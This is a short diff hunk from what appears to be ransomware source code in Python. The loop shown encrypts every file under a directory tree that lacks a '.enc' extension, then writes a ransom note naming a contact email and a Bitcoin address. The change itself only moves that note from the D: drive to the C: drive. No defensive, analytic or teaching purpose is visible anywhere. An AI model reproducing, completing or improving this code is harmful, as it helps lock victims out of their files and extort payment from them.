@@ -34,7 +34,7 @@ for root, _, files in list_file:
         if not file_name.endswith('.enc'):
             file_path = os.path.join(root, file_name)
             encrypt_file(file_path)
-    with open("D:/info.txt", "w") as f:
+    with open("C:/info.txt", "w") as f:
         f.write(f"email: lesyhoanganh2503@gmail.com")
         f.write(f"BTC address: 1LMcKyPmwebfygoeZP8E9jAMS2BcgH3Yip")
 
